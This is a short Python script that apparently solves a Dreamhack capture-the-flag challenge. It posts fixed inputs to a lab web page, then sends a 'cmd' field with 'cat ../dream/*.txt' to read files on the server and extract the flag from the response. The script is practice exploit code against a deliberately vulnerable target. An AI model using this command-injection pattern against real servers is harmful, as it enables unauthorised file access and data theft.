from bs4 import BeautifulSoup
import requests

URL = "http://host1.dreamhack.games:24413"
STEP2_URI = "/step2.php"
PAYLOAD = {"input1": "dnynyangang0310", "input2": "@13319!+1+13"}

# 1. ENTER STEP2
resp = requests.post(URL + STEP2_URI, data=PAYLOAD)

if (resp.text.find('Almost done...') > -1):
    # 2. GET FLAG
    PAYLOAD["cmd"] = "cat ../dream/*.txt"

    resp = requests.post(URL + STEP2_URI, data=PAYLOAD)

    soup = BeautifulSoup(resp.content,"html.parser")
    pre = soup.find('pre')
    flag = pre.contents[0]
    print(flag)